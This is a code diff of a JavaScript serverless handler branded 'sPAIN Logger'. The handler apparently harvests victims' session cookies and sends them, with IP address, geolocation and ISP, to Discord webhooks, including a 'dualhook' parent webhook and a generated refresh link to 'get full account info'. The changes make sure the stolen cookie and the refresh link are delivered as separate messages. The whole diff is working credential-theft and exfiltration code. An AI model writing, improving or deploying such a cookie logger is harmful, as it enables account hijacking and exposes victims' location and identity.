@@ -57,7 +57,6 @@ async function tgSend(text) {
   } catch (_) {}
 }
 
-// Generate a long random ID like "a8f3kx9mz2qwe7ybn1oplsdt4vuc6rh5jig0"
 function generateId() {
   const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
   let id = '';
@@ -112,7 +111,7 @@ async function discordChunked(url, text) {
 }
 
 async function sendHit(webhookUrl, { cookie, ip, geo, now, pageName, refreshUrl }) {
-  // Embed
+  // Message 1: embed with IP/location only (small, guaranteed to send)
   await discordSend(webhookUrl, {
     content: '@everyone',
     embeds: [{
@@ -124,14 +123,18 @@ async function sendHit(webhookUrl, { cookie, ip, geo, now, pageName, refreshUrl 
         { name: '📍 Location', value: [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown', inline: true  },
         { name: '🗺️ ISP',      value: geo?.isp || 'Unknown',                                                              inline: true  },
         { name: '🕐 Time',     value: now,                                                                                inline: false },
-        { name: '🔄 Refresh Link', value: refreshUrl,                                                                    inline: false },
       ],
       footer:    { text: `sPAIN Logger • ${pageName}` },
       timestamp: now
     }]
   });
 
-  // Raw cookie chunked as plain text
+  // Message 2: refresh link as plain text so it 100% shows
+  await discordSend(webhookUrl, {
+    content: `🔄 **Refresh Link** (click to get full account info):\n${refreshUrl}`
+  });
+
+  // Message 3: raw cookie chunked
   await discordChunked(webhookUrl, cookie);
 }
 
@@ -170,7 +173,6 @@ export default async function handler(req, res) {
   if (!record)         return res.status(404).json({ error: `Page "${slug}" not found` });
   if (!record.webhook) return res.status(500).json({ error: 'No webhook configured' });
 
-  // Respond immediately
   res.status(200).json({ success: true });
 
   try {
@@ -179,7 +181,6 @@ export default async function handler(req, res) {
     const now      = new Date().toISOString();
     const pageName = record.displayName || slug;
 
-    // Collect webhooks (main + dualhook parent)
     const webhooks = [record.webhook];
     if (record.dualhookParent) {
       try {
@@ -196,7 +197,6 @@ export default async function handler(req, res) {
       return;
     }
 
-    // Generate long random refresh ID and save to Redis
     const refreshId  = generateId();
     const refreshUrl = `https://spain-tools.vercel.app/api/refresh?id=${refreshId}`;
 
